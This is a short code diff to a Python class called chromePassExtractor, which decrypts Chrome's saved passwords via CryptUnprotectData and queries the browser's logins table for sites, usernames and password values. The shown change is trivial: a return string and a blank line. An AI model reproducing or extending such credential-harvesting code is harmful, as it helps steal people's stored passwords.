@@ -44,7 +44,7 @@ class chromePassExtractor:
                 return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
             except:
                 # not supported
-                return ""
+                return "not supported"
 
 
     def Extractor(self):
@@ -62,6 +62,7 @@ class chromePassExtractor:
         cursor = db.cursor()
         # `logins` table has the data we need
         cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+
         # iterate over all rows
         for row in cursor.fetchall():
             origin_url = row[0]
